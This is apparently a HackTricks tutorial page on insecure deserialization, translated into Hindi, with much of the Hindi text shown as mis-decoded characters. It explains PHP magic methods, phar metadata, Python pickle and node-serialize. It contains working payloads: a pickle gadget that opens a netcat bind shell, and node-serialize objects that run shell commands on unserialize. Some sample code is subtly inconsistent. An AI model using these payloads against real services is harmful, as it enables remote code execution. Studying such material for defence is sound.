# рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** (https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**Serialization** рдХреЛ рд╡рд╕реНрддреБ рдХреЛ рдПрдХ рдРрд╕реЗ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╛ рддреЛ рд╡рд╕реНрддреБ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдирд╛ рд╣реИ рдпрд╛ рдЗрд╕реЗ рд╕рдВрдЪрд╛рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░реЗрд╖рд┐рдд рдХрд░рдирд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд╕рд╛рдорд╛рдиреНрдпрдд: рдЙрдиреНрд╣реЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╡рд╕реНрддреБ рдХреЛ рдмрд╛рдж рдореЗрдВ рдкреБрдирдГ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЙрд╕рдХреА рд╕рдВрд░рдЪрдирд╛ рдФрд░ рд╕реНрдерд┐рддрд┐ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд╕рд╛рдеред

**Deserialization**, рдЙрд▓реНрдЯреЗ, serialization рдХрд╛ рд╡рд┐рд░реЛрдзреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рд▓реЗрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╕рдВрд░рдЪрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╡рд╕реНрддреБ рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг рдХрд░рдирд╛ред

Deserialization рдЦрддрд░рдирд╛рдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрдЧреНрд░рд╣реАрдд рдбреЗрдЯрд╛ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрд╛ рд╡рд╕реНрддреБ рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрдорд╛рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

## PHP

PHP рдореЗрдВ, serialization рдФрд░ deserialization рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рджреМрд░рд╛рди рд╡рд┐рд╢реЗрд╖ рдЬрд╛рджреВ рд╡рд┐рдзрд┐рдпрд╛рдБ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ:

* `__sleep`: рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдХреЛ serialization рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдЙрд╕ рд╡рд╕реНрддреБ рдХреЗ рд╕рднреА рдЧреБрдгреЛрдВ рдХреЗ рдирд╛рдореЛрдВ рдХрд╛ рдПрдХ рдЕрд░реНрд░рд╛рдп рд╡рд╛рдкрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ serialization рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рд▓рдВрдмрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд╕рдорд░реНрдкрд┐рдд рдХрд░рдиреЗ рдпрд╛ рд╕рдорд╛рди рд╕рдлрд╛рдИ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* `__wakeup`: рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдХреЛ deserialized рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддреЛ рдпрд╣ рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ serialization рдХреЗ рджреМрд░рд╛рди рдЦреЛ рдЧрдИ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЕрдиреНрдп рдкреБрдирд░рд╛рд░рдВрдн рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* `__unserialize`: рдпрд╣ рд╡рд┐рдзрд┐ `__wakeup` рдХреЗ рдмрдЬрд╛рдп (рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ) рдХреЛ рдмреБрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИ рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдХреЛ deserialized рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ `__wakeup` рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рджреЗрддрд╛ рд╣реИред
* `__destruct`: рдпрд╣ рд╡рд┐рдзрд┐ рдЬрдм рдПрдХ рд╡рд╕реНрддреБ рдирд╖реНрдЯ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╣реЛрддреА рд╣реИ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдмреБрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИред рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрдд: рд╕рдлрд╛рдИ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреИрд╕реЗ рдлрд╝рд╛рдЗрд▓ рд╣реИрдВрдбрд▓ рдХреЛ рдмрдВрдж рдХрд░рдирд╛ рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдмрдВрдж рдХрд░рдирд╛ред
* `__toString`: рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рд╡рд╕реНрддреБ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдпрд╛ рдЗрд╕рдХреЗ рднреАрддрд░ рдХрд╛рд░реНрдпреЛрдВ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреНрдп рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╡рд╕реНрддреБ рдХрд╛ рдкрд╛рдард┐рдХ рд░реВрдк рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
рдпрджрд┐ рдЖрдк рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреА рджрд┐рд╢рд╛ рдореЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди **`__wakeup`** рдФрд░ **`__destruct`** рдХреЛ рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ **`__toString`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдкреНрд░рддреАрдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **рдЕрдм рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ**ред
{% hint style="warning" %}
The method **`__unserialize(array $data)`** is called **instead of `__wakeup()`** if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

рдЖрдк рдпрд╣рд╛рдБ рдПрдХ рд╕реНрдкрд╖реНрдЯ **PHP рдЙрджрд╛рд╣рд░рдг рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), рдпрд╣рд╛рдБ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) рдпрд╛ рдпрд╣рд╛рдБ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

рдЖрдк PHP autoload functionality рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рдпрдорд┐рдд php рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЕрдзрд┐рдХ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Referenced Values рдХреЛ Serialize рдХрд░рдирд╛

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдЖрдк рдХрд┐рд╕реА рдореВрд▓реНрдп рдХреЛ **рдПрдХ рдЕрдиреНрдп рдореВрд▓реНрдп рдХреЗ рд╕рдВрджрд░реНрдн рдХреЗ рд░реВрдк рдореЗрдВ serialize** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) рдЖрдкрдХреЛ PHP рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП payloads рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдореЗрдВ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк **рдмрд╛рд╣рд░реА PHP рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреЗ рдХреЛрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рддреЛ, рдЕрдЧрд░ рд╕рдВрднрд╡ рд╣реЛ рддреЛ, рд╕рд░реНрд╡рд░ рдХрд╛ `phpinfo()` рдЬрд╛рдВрдЪреЗрдВ рдФрд░ **рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ** (рдФрд░ **PHPGGC** рдХреЗ **рдЧреИрдЬреЗрдЯреНрд╕** рдкрд░ рднреА) рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯ рдЬрд┐рд╕рдХрд╛ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### phar:// metadata deserialization

рдЕрдЧрд░ рдЖрдкрдиреЗ рдПрдХ LFI рдкрд╛рдпрд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдЕрдВрджрд░ PHP рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**file\_get\_contents(), fopen(), file() рдпрд╛ file\_exists(), md5\_file(), filemtime() рдпрд╛ filesize()**_ рдХреА рддрд░рд╣ рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рддреЛ рдЖрдк **phar** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдлрд╝рд╛рдЗрд▓** рдкрдврд╝рддреЗ рд╕рдордп рд╣реЛ рд░рд╣реА **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:
## Python

### **Pickle**

рдЬрдм рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЕрдирдкрд┐рдХрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдлрд╝рдВрдХреНрд╢рди _\_\_reduce\_\__ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрдЧрд╛ред\
рдЬрдм рдпрд╣ рд╢реЛрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рд╡рд╛рдкрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
### Yaml **&** jsonpickle

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдЙрди рддрдХрдиреАрдХ рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдпрд╛рдорд▓реНрд╕** рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдореЗрдВ **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **Pickle, PyYAML, jsonpickle рдФрд░ ruamel.yaml** рдХреЗ рд▓рд┐рдП RCE рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` рдФрд░ `prototype` рдкреНрд░рджреВрд╖рдг

рдпрджрд┐ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рджреЗрдЦреЗрдВ**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ serialize рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

The **serialised object** will looks like:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
рдЖрдк рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ serialize рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ serialized object рдореЗрдВ `_$$ND_FUNC$$_` рдлрд╝реНрд▓реИрдЧ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдлрд╝рд╛рдЗрд▓ `node-serialize/lib/serialize.js` рдореЗрдВ рдЖрдк рдЗрд╕реА рдлрд╝реНрд▓реИрдЧ рдХреЛ рдФрд░ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
![](<../../.gitbook/assets/image (351).png>)
![](<../../.gitbook/assets/image (446).png>)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдЦрдВрдб рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдЕрдЧрд░ рдлреНрд▓реИрдЧ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдореВрд▓ рд░реВрдк рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ `eval` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЕрдВрджрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдХреЗрд╡рд▓ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝** рдХрд░рдиреЗ рд╕реЗ рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреЛрдб рдХрд╛ рдХреБрдЫ рд╣рд┐рд╕реНрд╕рд╛ **рд╣рдорд╛рд░реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ `y.rce` рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рдмрд╣реБрдд рд╣реА **рдЕрд╕рдВрднрд╛рд╡рдиреАрдп** рд╣реИред\
рд╡реИрд╕реЗ, рдЖрдк рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдСрдЯреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреБрдЫ рдмреНрд░реИрдХреЗрдЯ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдХреЛрдб рдХреЗ рдЕрдЧрд▓реЗ рдЦрдВрдб рдореЗрдВ **рдЕрдВрддрд┐рдо рдмреНрд░реИрдХреЗрдЯ рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВ** рдФрд░ рдХреИрд╕реЗ `unserialize` рдлрд╝рдВрдХреНрд╢рди рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
